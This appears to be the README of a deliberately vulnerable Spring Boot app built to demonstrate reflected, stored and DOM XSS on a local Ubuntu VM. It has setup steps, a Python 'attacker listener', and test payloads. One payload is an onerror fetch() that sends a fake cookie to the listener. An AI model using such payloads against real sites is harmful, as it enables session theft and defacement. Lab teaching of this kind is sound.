# vuln-xss-app — Vulnerable XSS Demo (Ubuntu-only)

**Project:** `vuln-xss-app`
**Purpose:** Local, controlled demonstration of reflected, stored, and DOM XSS for educational use only.

> ⚠️ **Warning:** Do **not** run these payloads or servers against other machines or on the Internet. Run all demos only on an isolated Ubuntu VM or localhost.

---

## Contents

* `pom.xml` — Maven project file
* `src/main/java/com/example/vulnxss/` — Spring Boot sources
* `src/main/resources/static/` — static frontend (search.html, comments.html, etc.)
* `attacker_listener.py` — optional local listener for safe exfiltration demo (lab-only)

---

## Ubuntu Quickstart (summary)

1. Install prerequisites (OpenJDK 17, Maven, Python3).
2. Run Spring Boot app: `mvn spring-boot:run` (default port 8080).
3. Optionally run the Python listener: `python3 attacker_listener.py` (port 9000) for a safe exfiltration demo.
4. Open browser in the VM and test payloads at `http://localhost:8080`.

---

## 1. Prerequisites (Ubuntu)

Open a terminal in your Ubuntu VM and run:

```bash
sudo apt update
sudo apt install -y openjdk-17-jdk maven python3 python3-pip curl ca-certificates
```

Verify:

```bash
java -version
mvn -v
python3 --version
```

If you need Node/npm (optional for extra frontend tooling), install Node 18 LTS via NodeSource:

```bash
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs
node -v
npm -v
```

---

## 2. Prepare the project

Place (or clone) the project into your VM, e.g. `~/vuln-xss-app`. Confirm `pom.xml` is in the project root.

```bash
cd ~/vuln-xss-app
ls -la
# ensure pom.xml is present
```

---

## 3. Maven notes & common Java 17 issue

### Maven version & Java 17

Older Maven versions (notably 3.6.x installed from some apt repos) may use libraries that perform deep reflection (Guice/CGLIB) and can fail with `InaccessibleObjectException` on Java 17. If you see errors mentioning `com.google.inject.internal.cglib.core` or `Unable to make ... java.lang.ClassLoader.defineClass(...) accessible`, the cause is the JVM blocking reflective access.

**Quick temporary workaround:**

```bash
# in the shell before running maven commands (temporary for this session)
export MAVEN_OPTS="--add-opens=java.base/java.lang=ALL-UNNAMED"
mvn clean install -U
```

**Recommended:** upgrade Maven to a recent 3.8+ / 3.9.x release which bundles newer, Java-17–compatible libraries.

Example install of Maven 3.9.6 (one-off):

```bash
# download & extract (run as regular user; use sudo for /opt)
curl -fsSL https://archive.apache.org/dist/maven/maven-3/3.9.6/binaries/apache-maven-3.9.6-bin.tar.gz -o maven.tar.gz
sudo tar -xzf maven.tar.gz -C /opt
sudo ln -sf /opt/apache-maven-3.9.6/bin/mvn /usr/local/bin/mvn
hash -r
mvn -v
```

If `mvn -v` still shows an older Maven, remove the apt-installed package first:

```bash
sudo apt remove maven -y
hash -r
mvn -v
```

---

## 4. Build the project (from project root)

You must run Maven commands from the directory that contains `pom.xml`:

```bash
cd ~/vuln-xss-app
# build and update remote artifacts
mvn clean install -U
```

If Maven previously failed due to the reflection error, either set `MAVEN_OPTS` as above or upgrade Maven first.

---

## 5. Run the Spring Boot app

From the project root (same directory where `pom.xml` lives):

```bash
cd ~/vuln-xss-app
mvn spring-boot:run
# OR run on a different port
mvn spring-boot:run -Dspring-boot.run.arguments="--server.port=3001"
```

Watch the terminal logs — when you see a line like:

```
Tomcat started on port(s): 8080 (http)
Started VulnXssApplication in X seconds
```

then open the app in the VM browser: `http://localhost:8080` (or `:3001`).

If you run the browser on the host, use the VM's IP address instead.

---

## 6. Single-file Java server (no Maven alternative)

A lightweight single-file Java server (`VulnXssServer.java`) is available if you prefer not to use Maven.

```bash
# compile & run
javac VulnXssServer.java
java VulnXssServer
# server listens on http://localhost:3000
```

---

## 7. Optional: Local Python listener (safe exfil demo)

Create `attacker_listener.py` in the project root with this content (lab-only):

```python
# attacker_listener.py (lab-only)
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('content-length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        print("=== Request received ===")
        print("Path:", self.path)
        print("Headers:")
        for k, v in self.headers.items():
            print(f"  {k}: {v}")
        print("Body:")
        print(body)
        print("="*30)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 9000), Handler)
    print("Listening on http://0.0.0.0:9000 (press Ctrl+C to stop)")
    server.serve_forever()
```

Run it in a terminal:

```bash
python3 attacker_listener.py
```

Keep this terminal open — when a payload posts to `http://localhost:9000/log` the listener prints the request.

---

## 8. Test payloads (use in `q=` or comments form)

* Simple alert (may be blocked by modern browsers/extensions):

```
<script>alert('reflected')</script>
```

* Reliable onerror payload (expected 404 then runs):

```html
<img src=x onerror="console.log('XSS fired'); document.body.style.border='6px solid red'">
```

* Visual defacement (safe):

```html
<script>document.body.innerHTML='<h1 style="color:red">Hacked — demo</h1>'</script>
```

* Local exfil (lab-only):

```html
<img src=x onerror="fetch('http://localhost:9000/log',{method:'POST',headers:{'Content-Type':'text/plain'},body:'demo-cookie=FAKE'})">
```

---

## 9. Troubleshooting

* **Port already in use:**

  * `sudo lsof -i :8080` to see PID
  * `sudo kill <PID>` to stop it (only if safe)
  * Or run on another port with `--server.port=3001`.

* **`mvn` or `java` not found:** ensure packages from step 1 installed and re-open terminal.

* **InaccessibleObjectException / reflective access errors:**

  * Quick: `export MAVEN_OPTS="--add-opens=java.base/java.lang=ALL-UNNAMED"` then run `mvn clean install -U`.
  * Permanent: upgrade Maven to 3.8+/3.9.x as shown above.

* **Browser blocking alerts or execution:**

  * Use `console.log` + DOM banner payload for reliable evidence.
  * Test in a fresh browser profile or incognito to avoid extensions.

* **Listener not receiving requests:** ensure the `fetch` target is reachable from the browser. If browser runs on host and listener on VM, replace `localhost` with VM IP.
